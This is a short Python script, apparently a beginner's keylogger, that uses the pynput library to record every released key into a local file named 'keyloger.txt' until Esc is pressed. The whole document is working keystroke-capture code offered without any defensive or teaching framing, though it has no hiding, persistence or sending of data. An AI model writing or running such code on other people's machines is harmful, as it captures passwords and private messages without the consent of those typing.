from pynput import keyboard
#pynput module manage all the input output tracks.

def on_releas(key) :
    ker_str = str(key).replace("'","")
    if key == keyboard.Key.esc :
        return False
    with open("keyloger.txt","a") as f:
        f.write(ker_str)


with open("keyloger.txt","a" ) as f:
    f.write("\n\nNew section Started\n")

with keyboard.Listener(on_release=on_releas) as listner:
    listner.join()


